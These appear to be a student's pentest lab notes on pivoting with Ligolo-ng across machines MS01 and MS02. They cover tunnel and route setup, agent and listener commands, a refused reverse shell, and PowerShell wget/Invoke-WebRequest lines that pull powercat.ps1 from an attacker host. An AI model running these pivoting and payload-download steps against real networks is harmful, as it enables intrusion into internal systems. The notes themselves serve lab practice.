# Pivoting

Ligolo masterclass

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption><p>using MS01 IP and port 8001</p></figcaption></figure>

<div align="left"><figure><img src="../../.gitbook/assets/image (34).png" alt="" width="327"><figcaption></figcaption></figure></div>

<div align="left"><figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure></div>

Trying to run reverse shell on 4444 just refused

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Problems

The file transfer listener seems to die after one download - this happened twice like it just gave up stopped trying even IWR fails **(What if it's a SHELL ISSUE?????? Try nc64 transfer next omg how did i not think of that)**

<div align="left"><figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure></div>

### Findings

* This is incredibly fragile - breaks almost instantly I first thought it was a VPN issue but most likely we have to revert with every failed attempt
* File transfer worked with the same structure to add listener as reverse shell however after the first file it just stopped trying afterwards like there was a routing issue
* What if I try to replicate how it worked for me in my notes 0.0.0.0 style idk we'll see
* **Ligolo is not washed**, since we're using a powershell shell - IWR and wget only work and not certutil
* I thought maybe it could be either shell or directory writing issue (Windows\Temp, Users\Public & programdata) cus they said no perms

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

## Internal Subnet Tunneling

Ping to confirm if reachable

<pre><code>Kali
sudo ip tuntap add user jtripz mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.xx.xx.0/24 dev ligolo

MS01
.\agent.exe -connect &#x3C;Kali_IP>:11601 -retry -ignore-cert

Session 1
listener_add --addr 0.0.0.0:8001 --to 127.0.0.1:8001
File Transfer
<strong>listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
</strong>
To stop listener
listener_stop 

File Transfer Methods via PS (MS01 IP -> 10.10.106.147)
wget http://10.10.106.147:1234/powercat.ps1 -outfile C:\Users\Public\powercat
Invoke-WebRequest http://10.10.106.147:1234/powercat.ps1 -OutFile script.ps1

For CMD use certutil
</code></pre>

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption><p>El final</p></figcaption></figure>

<div align="left"><figure><img src="../../.gitbook/assets/image (41).png" alt="" width="458"><figcaption></figcaption></figure></div>

<div align="left"><figure><img src="../../.gitbook/assets/image (42).png" alt="" width="473"><figcaption><p>DIrectory did not matter</p></figcaption></figure></div>

## MS02 Port Forwarding

Set up a new network interface ligolo-double

The custom IP 240.0.0.1 is used by ligolo to access 'local' ports of agent machine

```
Session 1
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

Kali
sudo ip tuntap add user jtripz mode tun ligolo-double
sudo ip link set ligolo-double up
sudo ip route add 240.0.0.1/32 dev ligolo-double

MS02
.\agent.exe -connect <MS01 IP here>:11601 -retry -ignore-cert

Session 2
start --tun ligolo-double
```

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure></div>

<div align="left"><figure><img src="../../.gitbook/assets/image (45).png" alt="" width="470"><figcaption></figcaption></figure></div>

<div align="left"><figure><img src="../../.gitbook/assets/image (46).png" alt="" width="470"><figcaption></figcaption></figure></div>

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
